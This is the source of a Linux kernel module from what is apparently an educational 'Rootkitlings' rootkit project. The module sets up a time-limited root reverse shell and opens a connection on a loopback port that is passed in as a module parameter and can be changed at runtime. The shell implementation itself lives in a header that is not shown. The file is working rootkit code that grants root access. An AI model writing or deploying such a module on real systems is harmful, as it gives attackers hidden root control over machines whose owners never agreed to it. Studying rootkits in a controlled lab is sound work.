// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>

#include "root_shell.h"

#if ROOTKITLINGS_FAIL_POINT != 0
#error "unknown ROOTKITLINGS_FAIL_POINT"
#endif

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);
MODULE_PARM_DESC(shell_timeout_ms, "root-shell lifetime in milliseconds");

static struct rk_root_shell root_shell;
static unsigned short shell_port;

static int rk_shell_port_set(const char *value,
			     const struct kernel_param *parameter)
{
	unsigned short port;
	int error;

	error = kstrtou16(value, 0, &port);
	if (error)
		return error;
	if (!port)
		return -EINVAL;
	if (READ_ONCE(root_shell.initialized)) {
		error = rk_root_shell_request(&root_shell, port);
		if (error)
			return error;
	}
	*(unsigned short *)parameter->arg = port;
	return 0;
}

static const struct kernel_param_ops rk_shell_port_ops = {
	.set = rk_shell_port_set,
	.get = param_get_ushort,
};

module_param_cb(shell_port, &rk_shell_port_ops, &shell_port, 0600);
MODULE_PARM_DESC(shell_port, "request one loopback root-shell connection");

static int __init rk_init(void)
{
	int error;

	error = rk_root_shell_init(&root_shell, shell_timeout_ms);
	if (error)
		return error;
	if (shell_port)
		error = rk_root_shell_request(&root_shell, shell_port);
	if (error)
		rk_root_shell_stop(&root_shell);
	return error;
}

static void __exit rk_exit(void)
{
	rk_root_shell_stop(&root_shell);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings bounded root reverse shell");
